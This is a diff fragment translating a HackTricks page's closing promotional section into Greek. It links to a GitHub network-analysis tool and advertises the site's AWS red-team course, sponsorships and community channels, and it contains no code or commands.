+**Μπορείτε να χρησιμοποιήσετε το** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
